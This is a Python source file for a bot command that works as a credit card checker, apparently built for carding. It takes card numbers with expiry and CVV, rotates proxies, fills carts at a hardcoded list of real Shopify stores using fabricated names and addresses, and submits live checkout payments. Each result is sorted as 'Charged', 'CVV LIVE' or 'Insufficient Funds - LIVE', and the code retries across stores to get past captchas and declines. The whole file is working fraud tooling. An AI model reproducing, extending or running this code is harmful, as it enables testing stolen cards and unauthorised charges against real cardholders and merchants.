"""
Enhanced AutoShopify Gateway - Multi-Store Retry System
Features:
1. Enhanced product fetching with multiple products per store
2. Multi-store retry system until success/decline
3. Better error handling and fallback mechanisms
4. More verified Shopify stores
5. Improved proxy rotation
"""

import aiohttp
import random
import asyncio
from utils import Utils, extract_between
from commands.base_command import BaseCommand, CommandType
from urllib.parse import urlparse
import re
import time

# Enhanced list of verified working Shopify stores
VERIFIED_STORES = [
    {"url": "wiredministries.com", "name": "Wired Ministries"},
    {"url": "shopnicekicks.com", "name": "Shop Nice Kicks"},
    {"url": "culturekings.com.au", "name": "Culture Kings"},
    {"url": "kith.com", "name": "Kith"},
    {"url": "deadstock.ca", "name": "Deadstock"},
    {"url": "size.ca", "name": "Size?"},
    {"url": "notre-shop.com", "name": "Notre Shop"},
    {"url": "shoepalace.com", "name": "Shoe Palace"},
    {"url": "sneakerpolitics.com", "name": "Sneaker Politics"},
    {"url": "socialstatuspgh.com", "name": "Social Status"},
    {"url": "exclusivenyc.com", "name": "Exclusive NYC"},
    {"url": "bodega.com", "name": "Bodega"},
    {"url": "packershoes.com", "name": "Packer Shoes"},
    {"url": "saintalfred.com", "name": "Saint Alfred"},
    {"url": "concepts.com", "name": "Concepts"},
    {"url": "stussy.com", "name": "Stussy"},
    {"url": "palace-skateboards.com", "name": "Palace"},
    {"url": "travis-scott.com", "name": "Travis Scott"},
    {"url": "bape.com", "name": "BAPE"},
    {"url": "supreme.com", "name": "Supreme"},
]


class ShopifyProductManager:
    """Manages product fetching and caching for multiple stores"""

    def __init__(self):
        self.product_cache = {}
        self.cache_timeout = 300  # 5 minutes
        self.max_products_per_store = 10

    async def fetch_store_products(self, domain, proxy=None, max_products=10):
        """
        Fetch multiple products from a Shopify store

        Args:
            domain: Store domain
            proxy: Proxy string
            max_products: Maximum products to fetch

        Returns:
            List of product dictionaries
        """
        # Normalize domain
        if not domain.startswith("http"):
            domain = "https://" + domain
        domain = domain.rstrip("/")

        cache_key = f"{domain}:{max_products}"
        if cache_key in self.product_cache:
            cached_time, products = self.product_cache[cache_key]
            if time.time() - cached_time < self.cache_timeout:
                return products

        products = []

        try:
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                # Try to fetch products.json
                async with session.get(
                    f"{domain}/products.json?limit={max_products * 2}",
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=15),
                    headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Accept': 'application/json',
                    }
                ) as resp:
                    if resp.status != 200:
                        return []

                    data = await resp.json()
                    store_products = data.get('products', [])

                    for product in store_products[:max_products]:
                        variants = product.get('variants', [])
                        if not variants:
                            continue

                        # Get all available variants
                        available_variants = []
                        for variant in variants:
                            if variant.get('available', True) and variant.get('price', 0) > 0:
                                try:
                                    price = float(variant.get('price', 0))
                                    if price > 0:  # Skip free items
                                        available_variants.append({
                                            'variant_id': str(variant['id']),
                                            'price': f"{price:.2f}",
                                            'title': variant.get('title', ''),
                                            'sku': variant.get('sku', ''),
                                        })
                                except (ValueError, TypeError):
                                    continue

                        if available_variants:
                            products.append({
                                'site': domain,
                                'product_id': str(product['id']),
                                'title': product.get('title', 'Unknown'),
                                'handle': product.get('handle', ''),
                                'image': product.get('images', [{}])[0].get('src', ''),
                                'variants': available_variants,
                                'url': f"{domain}/products/{product.get('handle', '')}",
                            })

        except Exception as e:
            print(f"[Shopify] Error fetching products from {domain}: {e}")
            return []

        # Cache the results
        self.product_cache[cache_key] = (time.time(), products)
        return products


class MultiStoreRetrySystem:
    """System that tries multiple stores until success or decline"""

    def __init__(self, product_manager):
        self.product_manager = product_manager
        self.max_stores_to_try = 5
        self.used_stores = set()

    async def process_card_until_result(self, cc, mes, ano, cvv, user_stores=None, proxies=None):
        """
        Try processing a card on multiple stores until we get a definitive result

        Args:
            cc, mes, ano, cvv: Card details
            user_stores: User's specific stores (optional)
            proxies: Available proxies

        Returns:
            tuple: (success, message, store_used, amount, currency)
        """
        stores_to_try = []

        # First try user's stores if provided
        if user_stores:
            stores_to_try.extend(user_stores)

        # Then add verified stores
        available_stores = [store for store in VERIFIED_STORES if store['url'] not in self.used_stores]
        random.shuffle(available_stores)
        stores_to_try.extend(available_stores[:self.max_stores_to_try])

        print(f"[MultiStore] Will try {len(stores_to_try)} stores")

        for store_info in stores_to_try[:self.max_stores_to_try]:
            store_url = store_info['url']
            store_name = store_info.get('name', store_url)

            print(f"[MultiStore] Trying store: {store_name}")

            # Mark store as used
            self.used_stores.add(store_url)

            try:
                # Get proxy
                proxy_str = None
                if proxies:
                    proxy = random.choice(proxies) if isinstance(proxies, list) else proxies
                    proxy_str = f"http://{proxy.proxy}" if hasattr(proxy, 'proxy') else f"http://{proxy}"

                # Fetch products for this store
                products = await self.product_manager.fetch_store_products(store_url, proxy_str, 5)

                if not products:
                    print(f"[MultiStore] No products found for {store_name}")
                    continue

                # Try each product until we get a result
                for product in products:
                    if not product['variants']:
                        continue

                    # Try first available variant
                    variant = product['variants'][0]

                    print(f"[MultiStore] Testing {store_name} - {product['title']} (${variant['price']})")

                    result = await process_single_card(
                        cc, mes, ano, cvv,
                        store_url, variant['variant_id'],
                        proxy_str
                    )

                    success, message, gateway_name = result[:3]

                    # If we got a definitive result (not a network/proxy error), return it
                    if self._is_definitive_result(message):
                        amount = result[3] if len(result) > 3 else variant['price']
                        currency = result[4] if len(result) > 4 else 'USD'

                        print(f"[MultiStore] Got definitive result from {store_name}: {message}")
                        return success, message, f"{store_name} ({product['title']})", amount, currency

                    # If it's a network/proxy error, try next product
                    print(f"[MultiStore] Non-definitive result from {store_name}: {message}, trying next product...")

            except Exception as e:
                print(f"[MultiStore] Error with {store_name}: {e}")
                continue

        # If we tried all stores and got no definitive result
        return False, "Unable to get definitive result from any store", "Multiple Stores", "0.00", "USD"

    def _is_definitive_result(self, message):
        """Check if the result is definitive (not a network/proxy error)"""
        non_definitive_indicators = [
            "proxy", "network", "timeout", "connection", "captcha",
            "rate limit", "try different", "access denied"
        ]

        message_lower = message.lower()
        return not any(indicator in message_lower for indicator in non_definitive_indicators)


async def process_single_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str=None):
    """
    Process a single card on a specific store and variant

    Returns:
        tuple: (success, message, gateway_name, amount, currency)
    """
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Pragma': 'no-cache',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.8'
        }

        # Normalize URL
        if not site_url.startswith('http'):
            ourl = 'https://' + site_url
        else:
            ourl = site_url
        ourl = ourl.rstrip('/')

        # Generate user info
        firstName, lastName = Utils.get_random_name()
        email = Utils.generate_email(firstName, lastName)
        data = Utils.get_formatted_address()

        phone = data['phone']
        street = data['street']
        city = data['city']
        state = data['state']
        s_zip = data['zip']
        address2 = Utils.get_formatted_address()['street']

        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            cart_url = f"{ourl}/cart/add.js"
            checkout_url = f"{ourl}/checkout/"

            # Add to cart
            async with session.post(
                cart_url,
                data={'id': variant_id, 'quantity': 1},
                headers=headers,
                proxy=proxy_str,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as cart_resp:
                if cart_resp.status not in [200, 302]:
                    return False, f"Cart Error ({cart_resp.status})", ourl

            # Navigate to checkout
            async with session.post(
                checkout_url,
                headers=headers,
                proxy=proxy_str,
                timeout=aiohttp.ClientTimeout(total=20),
                allow_redirects=True
            ) as checkout_resp:
                checkout_url = str(checkout_resp.url)
                text = await checkout_resp.text()

            # Check for login requirement
            if 'login' in checkout_url.lower():
                return False, "Site requires login!", ourl

            # Extract session tokens
            sst = extract_between(text, 'name="serialized-session-token" content=""', '&q')
            if not sst:
                sst = extract_between(text, 'sessionToken":"', '"')

            if not sst:
                return False, "Failed to get session token!", ourl

            # Extract other tokens
            queueToken = extract_between(text, 'queueToken":"', '&q') or ''
            stableId = extract_between(text, 'stableId":"', '&q') or ''

            # Extract currency and amount
            currency_match = re.search(r'currencycode\s*[:=]\s*["\']?([A-Z]{3})["\']?', text, re.IGNORECASE)
            currency = currency_match.group(1).upper() if currency_match else 'USD'

            subtotal = extract_between(text, 'totalAmount":{"value":{"amount":"', '&q')
            if not subtotal:
                subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '&q')
            running_total = subtotal or '0.00'

            # GraphQL endpoint
            graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'

            # Shipping proposal (simplified)
            shipping_json = {
                'query': 'query Proposal($sessionInput:SessionTokenInput!,$queueToken:String,$delivery:DeliveryTermsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery},queueToken:$queueToken}){__typename result{...on NegotiationResultAvailable{sellerProposal{delivery{...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}}}}}}',
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken,
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'partialStreetAddress': {
                                    'address1': street,
                                    'address2': address2,
                                    'city': city,
                                    'countryCode': 'US',
                                    'postalCode': s_zip,
                                    'firstName': firstName,
                                    'lastName': lastName,
                                    'zoneCode': state,
                                    'phone': phone,
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {'any': True},
                                    'shipments': {'any': True},
                                }
                            },
                            'targetMerchandiseLines': {'any': True},
                            'deliveryMethodTypes': ['SHIPPING'],
                        }]
                    }
                },
                'operationName': 'Proposal',
            }

            # Send shipping proposal
            async with session.post(
                graphql_url,
                params={'operationName': 'Proposal'},
                headers={**headers, 'Content-Type': 'application/json'},
                json=shipping_json,
                proxy=proxy_str,
                timeout=aiohttp.ClientTimeout(total=20)
            ) as ship_resp:
                ship_text = await ship_resp.text()

                if 'CAPTCHA' in ship_text.upper():
                    return False, "Captcha Required - Use better proxies!", ourl

            # Tokenize card
            card_formatted = ' '.join([cc[i:i+4] for i in range(0, len(cc), 4)])

            async with session.post(
                'https://deposit.shopifycs.com/sessions',
                headers={
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                },
                json={
                    'credit_card': {
                        'number': card_formatted,
                        'name': f"{firstName} {lastName}",
                        'month': int(mes),
                        'year': int(f"20{ano}" if len(ano) == 2 else ano),
                        'verification_value': cvv
                    }
                },
                proxy=proxy_str,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as token_resp:
                token_data = await token_resp.json()
                payment_token = token_data.get('id', '')

                if not payment_token:
                    return False, "Card tokenization failed!", ourl

            # Submit payment
            submit_json = {
                'query': 'mutation SubmitForCompletion($sessionInput:SessionTokenInput!,$payment:PaymentTermInput){session(sessionInput:$sessionInput){submitForCompletion(input:{payment:$payment}){__typename receipt{...on ProcessedReceipt{id}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}}}}}}}',
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'payment': {
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'sessionId': payment_token,
                                    'paymentMethodIdentifier': 'https://ns.shopify.com/credit-card',
                                    'billingAddress': {
                                        'firstName': firstName,
                                        'lastName': lastName,
                                        'address1': street,
                                        'address2': address2,
                                        'city': city,
                                        'countryCode': 'US',
                                        'zoneCode': state,
                                        'postalCode': s_zip,
                                        'phone': phone,
                                    }
                                }
                            }
                        }]
                    }
                },
                'operationName': 'SubmitForCompletion',
            }

            async with session.post(
                graphql_url,
                params={'operationName': 'SubmitForCompletion'},
                headers={**headers, 'Content-Type': 'application/json'},
                json=submit_json,
                proxy=proxy_str,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as submit_resp:
                submit_text = await submit_resp.text()

            # Parse response
            text = submit_text.lower()

            # Check for various responses
            if 'your order total has changed' in text:
                return False, "Order total changed - Site issue!", ourl, running_total, currency

            if 'payment method is not available' in text or 'requested payment method' in text:
                return False, "Payment method not supported!", ourl, running_total, currency

            if 'captcha' in text:
                return False, "Captcha Required - Use better proxies!", ourl, running_total, currency

            # Extract error code
            code = extract_between(submit_text, '"code":"', '"') or ''

            # Check for success
            if 'actionrequired' in text or '3d' in text.lower():
                return False, "3D Secure Required", ourl, running_total, currency

            if 'processingerror' not in text and ('receipt' in text or 'processed' in text):
                return True, f"Charged! - {code or 'Success'}", ourl, running_total, currency

            # Check for CVV/live card indicators
            if any(err in text for err in ['incorrect_zip', 'zip']):
                return True, "Incorrect Zip Code - CVV LIVE", ourl, running_total, currency

            if any(err in text for err in ['insufficient_funds', 'insuff']):
                return True, "Insufficient Funds - LIVE", ourl, running_total, currency

            if any(err in text for err in ['invalid_cvc', 'incorrect_cvc', 'cvc']):
                return True, f"CVV Error - {code}", ourl, running_total, currency

            if 'processingerror' in text:
                return False, code or "Processing Error", ourl, running_total, currency

            # Default decline
            return False, code or "Card Declined", ourl, running_total, currency

    except Exception as e:
        return False, f"Error: {str(e)[:50]}", ourl if 'ourl' in locals() else "Unknown", "0.00", "USD"


# Global instances
product_manager = ShopifyProductManager()
retry_system = MultiStoreRetrySystem(product_manager)


async def process_card_enhanced(cc, mes, ano, cvv, site=None, proxies=None):
    """
    Enhanced card processing with multi-store retry system

    Args:
        cc, mes, ano, cvv: Card details
        site: User stores (optional)
        proxies: Available proxies

    Returns:
        tuple: (success, message, gateway_name, amount, currency)
    """
    try:
        # Extract user stores if provided
        user_stores = []
        if site:
            if isinstance(site, (list, tuple)):
                for s in site:
                    if hasattr(s, 'url'):
                        user_stores.append({'url': s.url, 'name': s.url})
                    elif isinstance(s, dict):
                        user_stores.append(s)
                    else:
                        user_stores.append({'url': str(s), 'name': str(s)})
            elif hasattr(site, 'url'):
                user_stores = [{'url': site.url, 'name': site.url}]
            else:
                user_stores = [{'url': str(site), 'name': str(site)}]

        # Process with retry system
        return await retry_system.process_card_until_result(cc, mes, ano, cvv, user_stores, proxies)

    except Exception as e:
        return False, f"Enhanced processing error: {str(e)[:50]}", "MultiStore System", "0.00", "USD"


async def register_enhanced_shopify_gateway(bot):
    """Register the enhanced Shopify gateway with multi-store retry"""
    base_command = BaseCommand(
        bot=bot,
        name="Shopify Enhanced",
        cmd="shx",
        handler=process_card_enhanced,
        cmd_type=CommandType.MASS,
        premium=False,
        amount='Custom',
        status=True,
        description="Enhanced Shopify with multi-store retry system"
    )
    base_command.register_command()
